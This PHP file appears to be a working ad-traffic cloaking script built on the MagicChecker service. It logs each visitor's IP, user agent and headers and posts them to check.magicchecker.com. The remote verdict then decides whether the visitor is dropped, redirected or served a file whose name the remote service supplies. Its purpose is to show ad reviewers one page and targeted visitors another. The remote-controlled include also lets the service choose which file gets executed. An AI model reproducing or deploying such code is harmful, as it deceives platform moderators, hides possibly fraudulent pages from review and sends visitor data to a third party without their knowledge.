<?php
// to view php errors (it can be useful if you got blank screen and there is no clicks in the site statictics) uncomment next two strings:
//error_reporting(E_ALL);
//ini_set('display_errors', 1);

define('CAMPAIGN_ID', "3c72a7bff719a5884a1c5a4b5018f068");
define('REQUEST_LIVE_TIME', 3600);
define('ENC_KEY', '9cbe4d481553611b3b0fb0bbc06ceb28');
define('MP_PARAM_NAME', '__ia_id');
define('NOT_FOUND_TEXT', '<h1>Page not found</h1>');
define('CHECK_MCPROXY', 0);
define('CHECK_MCPROXY_PARAM', '646fe69d6bb15794bc45ca2de692856a');
define('CHECK_MCPROXY_VALUE', '919e83d5ef35328c730952871200a654764f3ec6c3a9ab3714311c0f3ff777a7');


// === DEBUG REFERER (временно оставь) ===
$log = date('Y-m-d H:i:s') . " | ";
$log .= "HTTP_REFERER: " . (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'EMPTY') . "\n";
$log .= "HTTP_USER_AGENT: " . (isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'no') . "\n";
$log .= "REMOTE_ADDR: " . ($_SERVER['REMOTE_ADDR'] ?? 'no') . "\n";
$log .= "REQUEST_URI: " . ($_SERVER['REQUEST_URI'] ?? 'no') . "\n";
$log .= "All HTTP_ keys: " . implode(', ', array_filter(array_keys($_SERVER), fn($k) => strpos($k, 'HTTP_') === 0)) . "\n";
$log .= str_repeat("=", 80) . "\n";

file_put_contents(__DIR__ . '/referer_debug.log', $log, FILE_APPEND);
// =============
function translateCurlError($code) {
  $output = '';$curl_errors = array(2  => "Can't init curl.",6  => "Can't resolve server's DNS of our domain. Please contact your hosting provider and tell them about this issue.",7  => "Can't connect to the server.",28 => "Operation timeout. Check you DNS setting.");if (isset($curl_errors[$code])) $output = $curl_errors[$code];else $output = "Error code: $code . Check if php cURL library installed and enabled on your server.";

  $f = fopen(dirname(__FILE__) .'/curl_errors.txt', 'a');
  fputs($f, "$output\n");
  fclose($f);

  return $output;
}
function checkCache() {$res = "";$service_port = 8082;$address = "127.0.0.1";$socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);if ($socket !== false) {$result = @socket_connect($socket, $address, $service_port);if ($result !== false) {$port = isset($_SERVER['HTTP_X_FORWARDED_REMOTE_PORT']) ? $_SERVER['HTTP_X_FORWARDED_REMOTE_PORT'] : $_SERVER['REMOTE_PORT']; $in = $_SERVER['REMOTE_ADDR'] . ":" . $port . "\n"; socket_write($socket, $in, strlen($in));while ($out = socket_read($socket, 2048)) {$res .= $out;}}} return $res;}

function sendRequest($data, $path = 'index') {
    $headers = array('adapi: 2.2');

    $referer = isset($_SERVER['HTTP_REFERER']) ? trim($_SERVER['HTTP_REFERER']) : '';

    if ($path == 'index') {
        $data['HTTP_MC_CACHE'] = checkCache();
    }

    // mcproxy check (оставляем как было)
    if (CHECK_MCPROXY || (isset($_GET[CHECK_MCPROXY_PARAM]) && ($_GET[CHECK_MCPROXY_PARAM] == CHECK_MCPROXY_VALUE))) {
        if (trim($data['HTTP_MC_CACHE'] ?? '')) {
            print 'mcproxy is ok';
        } else {
            print 'mcproxy error';
        }
        die();
    }

    $data_to_post = array(
        "cmp"     => CAMPAIGN_ID,
        "headers" => $data,
        "adapi"   => '2.2',
        "sv"      => '18780.3'
    );

    $ch = curl_init("http://check.magicchecker.com/v2.2/" . $path . '.php');

    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data_to_post));

    // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
    // Улучшенная передача Referer (оба способа)
    if (!empty($referer)) {
        curl_setopt($ch, CURLOPT_REFERER, $referer);                    // Для HTTP-заголовка
        $headers[] = 'Referer: ' . $referer;                            // Для массива headers в POST
    } else {
        // Если referer пустой — можно задать fallback (домены сайта)
        // curl_setopt($ch, CURLOPT_REFERER, 'https://smartmove-home.site/');
    }
    // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $output = curl_exec($ch);
    $info = curl_getinfo($ch);

    if (strlen($output) == 0 || $info['http_code'] != 200) {
        $curl_err_num = curl_errno($ch);
        curl_close($ch);

        if ($curl_err_num != 0) {
            header($_SERVER['SERVER_PROTOCOL'] . ' 503 Service Unavailable');
            print 'cURL error ' . $curl_err_num . ': ' . translateCurlError($curl_err_num);
        } else {
            header($_SERVER['SERVER_PROTOCOL'] . ' ' . $info['http_code']);
            print '<h1>Error ' . $info['http_code'] . '</h1>';
        }
        die();
    }

    curl_close($ch);
    return $output;
}

function isBlocked($testmode = false) {
  $result = new stdClass();
  $result->hasResponce = false;
  $result->isBlocked = false;
  $result->errorMessage = '';
  $data_headers = array();

  foreach ( $_SERVER as $name => $value ) {
    if (is_array($value)) {
      $value = implode(', ', $value);
    }
    if ((strlen($value) < 1024) || ($name == 'HTTP_REFERER') || ($name == 'QUERY_STRING') || ($name == 'REQUEST_URI') || ($name == 'HTTP_USER_AGENT')) {
      $data_headers[$name] = $value;
    } else {
      $data_headers[$name] = 'TRIMMED: ' .substr($value, 0, 1024);
    }
  }

  $output = sendRequest($data_headers);
  if ($output) {
    $result->hasResponce = true;
    $answer = json_decode($output, TRUE);
    if (isset($answer['ban']) && ($answer['ban'] == 1)) die();

    if ($answer['success'] == 1) {
      foreach ($answer as $ak => $av) {
        $result->{$ak} = $av;
      }
    }
    else {
      $result->errorMessage = $answer['errorMessage'];
    }
  }
  return $result;
}

// ====================== ВЗВЕШЕННЫЙ РАНДОМ с пустым utm_source ======================
// ====================== ВЗВЕШЕННЫЙ РАНДОМ utm_source ======================
function getRandomWeightedUtmSource()
{
    $weighted_sources = [
        ''           => 100, // 100% шанс не добавлять utm_source
    ];

    $total = array_sum($weighted_sources);
    $rand  = mt_rand(1, $total);

    foreach ($weighted_sources as $source => $weight) {
        $rand -= $weight;
        if ($rand <= 0) {
            return $source;
        }
    }

    return ''; // на всякий случай
}

function addOrReplaceUtmSource($url, $source)
{
    if (preg_match('/[?&]utm_source=[^&]*/i', $url)) {
        $url = preg_replace('/([?&])utm_source=[^&]*/i', '$1utm_source=' . urlencode($source), $url);
    } else {
        $separator = (strpos($url, '?') === false) ? '?' : '&';
        $url .= $separator . 'utm_source=' . urlencode($source);
    }

    return $url;
}

function _redirectPage($url, $send_params, $return_url = false) {
  //  Получаем случайный куки 
    // $cookies = random_bytes(16);
    // $source = bin2hex($cookies);


    // === Здесь ставим куки ===
    // setcookie('cookie', $source, [
    //     'expires' => time() + 30,   // 30 секунд, например
    //     'path'    => '/',
    //     'domain'  => '',                        // или $_SERVER['HTTP_HOST'] без порта
    //     'secure'  => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on',
    //     'httponly'=> true,
    //     'samesite'=> 'Lax'                      // или 'None' если нужен кросс-сайт
    // ]);



    $utm_source = getRandomWeightedUtmSource();

    // Если выбран НЕ пустой source — добавляем его
    if ($utm_source !== '') {
        $url = addOrReplaceUtmSource($url, $utm_source);
    }
    // Если выбран пустой — просто ничего не добавляем

    if ($return_url) {
        return $url;
    }

    header("Location: $url", true, 302);
    exit;
}

function _includeFileName($url) {
  if (strpos($url, '/') !== false) {
    $url = ltrim(strrchr($url, '/'), '/');
  }
  if (strpos($url, '?') !== false) {
    $url = explode('?', $url);
    $url = $url[0];
  }
  return $url;
}

////////////////////////////////////////////////////////////////////////////////


$result = isBlocked();
if ($result->hasResponce && !isset($result->error_message)) {

    if ($result->urlType == 'redirect') {
      _redirectPage($result->url, $result->send_params);
    }
    else {
      include _includeFileName($result->url);
    }

}
else {
  die('Error: ' .$result->errorMessage);
}
